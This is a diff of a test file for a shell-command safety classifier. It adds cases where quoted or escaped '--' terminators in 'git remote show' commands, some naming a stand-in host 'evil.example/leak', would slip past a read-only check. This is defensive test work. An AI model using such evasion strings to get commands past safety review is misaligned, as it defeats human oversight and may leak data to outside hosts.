@@ -429,6 +429,15 @@ describe('classifyShellCommandSafety', () => {
       // on the pre-terminator slice; these pin that it does.
       'git remote show origin -- -n',
       'git remote show -- -n https://evil.example/leak',
+      // bash removes quotes and backslashes before git runs, so each of these
+      // reaches git as a bare `--` although the argument text still holds them.
+      'git remote show https://evil.example/leak \\-- -n',
+      'git remote show https://evil.example/leak \\-\\- -n',
+      'git remote show origin ""-- -n',
+      'git remote show origin --"" -n',
+      "git remote show origin ''-- -n",
+      "git remote show origin '-'- -n",
+      "git remote show origin $'--' -n",
     ])('routes %j to review instead of auto-running it', async (command) => {
       expect(await classifyShellCommandSafety(command)).toBe('unknown');
       expect(await isShellCommandReadOnlyAST(command)).toBe(false);
@@ -442,6 +451,7 @@ describe('classifyShellCommandSafety', () => {
       // leading-options-only scan cannot silently narrow it.
       'git remote show origin -n',
       'git remote show https://evil.example/leak -n',
+      'git remote show -n "origin"',
       'git remote get-url origin',
     ])('keeps %j read-only', async (command) => {
       expect(await classifyShellCommandSafety(command)).toBe('read-only');
@@ -1040,6 +1050,8 @@ describe('consistency: isShellCommandReadOnly (regex) vs isShellCommandReadOnlyA
     ['git branch -d feature', false],
     ['git remote -v', true],
     ['git remote add origin url', false],
+    ['git remote show origin \\-- -n', false, 'escaped terminator'],
+    ["git remote show origin ''-- -n", false, 'quoted terminator'],
     ['git --version', true],
 
     // --- find ---
